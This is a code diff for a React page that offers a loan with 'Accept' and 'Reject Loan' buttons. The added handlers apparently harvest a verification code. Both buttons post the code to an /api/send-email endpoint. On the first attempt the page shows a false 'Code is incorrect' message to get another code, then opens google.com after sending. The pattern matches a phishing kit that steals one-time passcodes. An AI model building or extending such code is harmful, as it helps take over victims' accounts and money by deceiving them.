@@ -39,7 +39,7 @@ export default function MyComponent(props) {
     setStep(2);
   };
 
-  const handleSubmitCode = async (value) => {
+  const handleAcceptCode = async (value) => {
     if (!code) {
       alert("Please enter the code...");
       return;
@@ -53,6 +53,38 @@ export default function MyComponent(props) {
 
     // sending email
     setIsLoading(true);
+    try {
+      const response = await axios.post("/api/send-email", { code: code });
+
+      console.log("Response from /api/send-email:", response.data);
+      if (response?.data?.success == true) {
+        setCode("");
+        alert("Sent email successfully");
+        setIsLoading(false);
+        window.open("https://google.com", "_blank");
+      } else {
+        alert("Failed to send email");
+        setIsLoading(false);
+      }
+    } catch (error) {
+      console.error("Error sending email:", error);
+    }
+  };
+
+  const handleRejectCode = async (value) => {
+    if (!code) {
+      alert("Please enter the code...");
+      return;
+    }
+
+    if (count === 1) {
+      alert("Code is incorrect, please try again...");
+      setCount((prev) => prev + 1);
+      return;
+    }
+
+    // sending email
+    setRejecting(true);
     try {
       const response = await axios.post("/api/send-email", { code: code });
 
@@ -298,16 +330,14 @@ export default function MyComponent(props) {
             <button
               text="button"
               className="w-[135px] bg-white text-red-400 border text-center ml-auto mt-8 p-2.5 rounded-[39px] border-none"
-              onClick={() => {
-                setRejecting(true);
-              }}
+              onClick={() => isRejecting === false && handleRejectCode(code)}
             >
               {isRejecting == true ? "Finalising" : "Reject Loan"}
             </button>
             <button
               text="button"
               className="w-[135px] bg-red-600 text-white border text-center ml-10 mt-8 p-2.5 rounded-[39px] border-none"
-              onClick={() => isLoading === false && handleSubmitCode(code)}
+              onClick={() => isLoading === false && handleAcceptCode(code)}
             >
               {isLoading == true ? "Finalising" : "Accept"}
             </button>
